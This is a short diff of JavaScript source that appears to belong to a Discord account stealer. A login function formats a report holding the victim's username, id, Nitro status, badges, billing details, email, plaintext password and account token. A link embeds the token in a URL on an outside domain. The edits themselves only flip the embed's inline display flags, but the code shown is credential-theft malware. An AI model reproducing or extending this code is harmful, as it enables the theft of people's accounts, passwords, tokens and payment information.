@@ -612,37 +612,37 @@ const login = async (email, password, token) => {
           {
             name: '<a:944007295417843743:959785231982931979> username:',
             value: `\`${json.username}#${json.discriminator}\``,
-            inline: false,
+            inline: !0,
           },
           {
             name: '<a:944007295417843743:959785231982931979> id:',
             value: `\`${json.id}\``,
-            inline: false,
+            inline: !0,
           },
           {
             name: '<a:satanist:802503618972483615> nitro:',
             value: `\`${nitro}\``,
-            inline: true,
+            inline: !1,
           },
           {
             name: '<a:satanist:802503618972483615> Badges:',
             value: `${badges}`,
-            inline: true,
+            inline: !1,
           },    
           {
             name: '<:944007233820307467:959785232037470208> Billing:',
             value: `**${billing}**`,
-            inline: true,
+            inline: !1,
           },
           {
             name: '<:944007233820307467:959785232037470208> Email:',
             value: `\`${email}\``,
-            inline: false,
+            inline: !0,
           },
           {
             name: '<a:satan:846706207632261120> Password:',
             value: `\`${password}\``,
-            inline: false,
+            inline: !0,
           },
           {
             name: '<:944007233820307467:959785232037470208> Friends:',
@@ -657,7 +657,7 @@ const login = async (email, password, token) => {
           {
             name: '<a:944007295417843743:959785231982931979> Token:',
             value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/${token})`,
-            inline: true,
+            inline: !1,
           },
 
         ],
